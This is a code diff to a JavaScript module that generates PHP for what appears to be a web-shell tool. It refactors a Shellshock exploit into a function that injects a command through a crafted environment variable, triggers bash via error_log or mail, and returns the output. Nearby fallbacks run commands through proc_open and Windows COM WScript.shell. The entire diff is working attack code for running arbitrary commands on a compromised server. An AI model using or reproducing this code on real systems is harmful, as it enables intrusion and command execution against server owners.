@@ -18,6 +18,28 @@ module.exports = (arg1, arg2) => ({
         }
         return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));
       };
+      function runshellshock($d, $c) {
+        if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {
+          if (strstr(readlink("/bin/sh"), "bash") != FALSE) {
+            $tmp = tempnam(sys_get_temp_dir(), 'as');
+            putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
+            if (fe('error_log')) {
+              error_log("a", 1);
+            } else {
+              mail("a@127.0.0.1", "", "", "-bv");
+            }
+          } else {
+            return False;
+          }
+          $output = @file_get_contents($tmp);
+          @unlink($tmp);
+          if ($output != "") {
+            print($output);
+            return True;
+          }
+        }
+        return False;
+      };
       function runcmd($c){
         $ret=0;
         $d=dirname($_SERVER["SCRIPT_FILENAME"]);
@@ -49,25 +71,8 @@ module.exports = (arg1, arg2) => ({
           @proc_close($p);
         }elseif(fe('antsystem')){
           @antsystem($c);
-        }elseif(substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {
-          if(strstr(readlink("/bin/sh"),"bash")!=FALSE){
-            $tmp=tempnam(sys_get_temp_dir(), 'as');
-            putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
-            if (fe('error_log')) {
-              error_log("a", 1);
-            }else{
-              mail("a@127.0.0.1", "", "", "-bv");
-            }
-          }else{
-            print("Not vuln (not bash)\n");
-          }
-          $output = @file_get_contents($tmp);
-          @unlink($tmp);
-          if($output!=""){
-            print($output);
-          }else{
-            print("No output, or not vuln.");
-          }
+        }elseif(runshellshock($d, $c)) {
+          return $ret;
         }elseif(substr($d,0,1)!="/" && @class_exists("COM")){
           $w=new COM('WScript.shell');
           $e=$w->exec($c);
